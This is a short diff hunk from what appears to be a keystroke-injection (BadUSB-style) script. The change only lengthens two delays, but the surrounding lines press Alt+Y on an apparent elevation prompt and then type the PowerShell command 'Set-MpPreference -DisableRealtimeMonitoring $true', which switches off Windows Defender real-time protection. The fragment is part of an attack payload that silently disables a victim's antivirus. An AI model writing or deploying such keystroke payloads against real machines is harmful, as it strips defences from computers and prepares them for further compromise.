@@ -64,11 +64,11 @@ Delay 1000
 Press KEY_LEFT_ALT
 Press Y
 Release
-Delay 1000
+Delay 2000
 Press KEY_LEFT_ARROW
 PressRelease KEY_ENTER
 Release
-Delay 500
+Delay 1000
 
 WinPrintLine Set-MpPreference -DisableRealtimeMonitoring $true
 
